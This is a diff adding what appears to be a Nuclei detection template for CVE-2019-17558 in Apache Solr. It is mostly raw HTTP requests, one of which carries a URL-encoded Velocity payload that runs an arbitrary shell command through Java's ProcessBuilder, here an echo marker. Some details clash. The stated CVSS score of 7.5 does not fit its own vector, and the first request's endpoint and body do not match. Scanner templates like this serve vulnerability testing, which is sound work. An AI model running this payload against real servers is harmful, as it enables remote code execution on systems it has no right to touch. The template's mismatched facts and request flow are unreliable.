@@ -1,0 +1,53 @@
+id: cve-2019-17558
+info:
+  name: Apache Solr Velocity Template Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Apache Solr versions 5.0.0 to 8.3.1 have a vulnerability that allows injection attacks through Velocity templates. Attackers can exploit this vulnerability to execute arbitrary code.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2019-17558
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 7.5
+    cve-id: CVE-2019-17558
+    cwe-id: CWE-94
+http:
+  - raw:
+      - |
+        POST /solr/admin/cores?indexInfo=false&wt=json HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "update-queryresponsewriter": {
+            "startup": "lazy",
+            "name": "velocity",
+            "class": "solr.VelocityResponseWriter",
+            "template.base.dir": "",
+            "solr.resource.loader.enabled": "true",
+            "params.resource.loader.enabled": "true"
+          }
+        }
+    extractors:
+      - type: regex
+        name: core_names
+        part: body
+        internal: true
+        regex:
+          - '"name":"([^"]+)"'
+  - raw:
+      - |
+        GET /solr/{{core_names}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set%28%24x%3D%27%27%29%20%23set%28%24c%3D%22echo%2049920fb93da9e219%22%29%20%23set%28%24os%3D%24x.class.forName%28%22java.lang.System%22%29.getProperty%28%22os.name%22%29%29%20%23set%28%24command%3D%5B%5D%29%20%23if%28%24os.toLowerCase%28%29.contains%28%22win%22%29%29%20%23set%28%24command%3D%5B%22cmd%22%2C%20%22%2Fc%22%2C%20%24c%5D%29%20%23else%20%23set%28%24command%3D%5B%22bash%22%2C%20%22-c%22%2C%20%24c%5D%29%20%23end%20%23set%28%24chr%3D%24x.class.forName%28%27java.lang.Character%27%29%29%20%23set%28%24str%3D%24x.class.forName%28%27java.lang.String%27%29%29%20%23set%28%24pbClass%20%3D%20%24x.class.forName%28%27java.lang.ProcessBuilder%27%29%29%20%23set%28%24constructor%20%3D%20%24pbClass.getConstructors%28%29%5B0%5D%29%20%23set%28%24processBuilder%20%3D%20%24constructor.newInstance%28%24command%29%29%20%23set%28%24ex%20%3D%20%24processBuilder.start%28%29%29%20%24ex.waitFor%28%29%20%23set%28%24out%3D%24ex.getInputStream%28%29%29%20%23foreach%28%24i%20in%20%5B1..%24out.available%28%29%5D%29%24str.valueOf%28%24chr.toChars%28%24out.read%28%29%29%29%23end HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "49920fb93da9e219"
+      - type: regex
+        part: body
+        regex:
+          - "responseHeader"
+        negative: true
